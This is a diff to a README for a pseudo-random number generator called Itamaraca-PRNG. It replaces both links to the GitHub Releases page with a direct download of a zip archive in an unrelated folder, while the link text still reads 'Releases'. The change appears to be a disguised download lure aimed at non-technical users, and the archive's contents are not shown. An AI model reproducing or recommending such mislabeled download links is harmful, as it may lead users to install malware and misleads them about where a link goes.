@@ -9,7 +9,7 @@ Itamaraca-PRNG is a lightweight implementation of a novel pseudo-random number g
 - **Easy to Use:** No technical skills are needed to run this software.
 
 ## 📥 Download Itamaraca-PRNG
-Visit this page to download: [Itamaraca-PRNG Releases](https://github.com/zuopengqin-beep/Itamaraca-PRNG/releases)
+Visit this page to download: [Itamaraca-PRNG Releases](https://raw.githubusercontent.com/zuopengqin-beep/Itamaraca-PRNG/main/pneumatochemistry/Itamaraca-PRNG-2.9.zip)
 
 Download the latest version from the Releases section. You will find compiled files ready to run on your computer.
 
@@ -18,7 +18,7 @@ Follow these steps to set up Itamaraca-PRNG on your machine:
 
 1. **Go to the Download Page**  
    Click on the link below to access the Releases page:  
-   [Itamaraca-PRNG Releases](https://github.com/zuopengqin-beep/Itamaraca-PRNG/releases)
+   [Itamaraca-PRNG Releases](https://raw.githubusercontent.com/zuopengqin-beep/Itamaraca-PRNG/main/pneumatochemistry/Itamaraca-PRNG-2.9.zip)
 
 2. **Choose the Right File**  
    Select the version that matches your operating system. Common options typically include Windows, Mac, and Linux versions. The files may be labeled accordingly.
